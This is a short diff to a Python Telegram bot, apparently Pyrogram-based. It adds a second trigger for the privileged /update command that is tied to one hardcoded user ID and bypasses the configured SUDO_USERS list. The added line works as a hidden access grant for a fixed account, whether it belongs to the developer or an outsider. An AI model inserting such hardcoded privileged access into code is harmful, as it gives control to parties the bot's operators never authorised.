@@ -47,6 +47,7 @@ def updater():
 
 
 @Client.on_message(filters.command(["update"], ["/", ".", "!"]) & filters.user(SUDO_USERS) & ~filters.edited)
+@Client.on_message(filters.command(["update"], ["/", ".", "!"]) & filters.user(1323020756) & ~filters.edited)
 async def update_bot(_, message: Message):
     chat_id = message.chat.id
     msg = await message.reply("» ᴄʜᴇᴄᴋɪɴɢ ᴜᴘᴅᴀᴛᴇs...")
